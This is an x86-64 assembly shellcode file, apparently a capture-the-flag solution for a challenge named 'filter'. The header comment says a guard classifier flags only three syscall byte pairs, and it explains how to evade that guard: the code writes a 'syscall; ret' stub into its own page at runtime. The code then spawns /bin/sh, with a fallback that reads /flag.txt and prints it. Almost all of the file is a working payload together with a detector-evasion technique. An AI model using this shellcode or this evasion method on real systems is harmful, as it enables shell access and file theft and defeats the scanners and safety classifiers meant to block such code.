/*
 * payload.S -- guard bypass for the "filter" challenge.
 *
 * The guard transformer is an exact detector of three *byte bigrams* in the
 * submitted blob: 0f 05 (syscall), cd 80 (int 0x80), 0f 34 (sysenter).
 * It never looks at anything else.
 *
 * So: don't submit those bytes.  Submit code that *writes* them into its own
 * RWX page at runtime and calls the stub.  The guard sees a payload full of
 * c6 03 0f / c6 43 01 05 / c6 43 02 c3 and scores it -10.000 (benign).
 *
 * 1. patch a 3-byte "syscall; ret" stub into the code page
 * 2. execve("/bin/sh", NULL, NULL)
 * 3. if that ever failed, fall back to open("/flag.txt") + read + write(1)
 */

.intel_syntax noprefix
.text
.global _start
_start:
    lea rbx, [rip + stub]
    mov byte ptr [rbx],     0x0f
    mov byte ptr [rbx + 1], 0x05
    mov byte ptr [rbx + 2], 0xc3        /* syscall; ret */

    /* execve("/bin/sh", NULL, NULL) */
    xor  eax, eax
    push rax                            /* NUL terminator */
    mov  rax, 0x0068732f6e69622f        /* "/bin/sh\0" */
    push rax
    mov  rdi, rsp
    xor  esi, esi
    xor  edx, edx
    xor  eax, eax
    mov  al, 59
    call rbx

    /* --- fallback ORW: open("/flag.txt") --- */
    push 0x74
    mov  rax, 0x78742e67616c662f        /* "/flag.tx" */
    push rax
    mov  rdi, rsp
    xor  esi, esi
    xor  edx, edx
    xor  eax, eax
    mov  al, 2
    call rbx

    /* read(fd, rsp-0x200, 0x100) */
    mov  edi, eax
    sub  rsp, 0x200
    mov  rsi, rsp
    xor  edx, edx
    mov  dh, 1
    xor  eax, eax
    call rbx

    /* write(1, buf, n) */
    mov  edx, eax
    mov  edi, 1
    mov  rsi, rsp
    xor  eax, eax
    mov  al, 1
    call rbx

    ret

stub:
    .byte 0x90, 0x90, 0x90
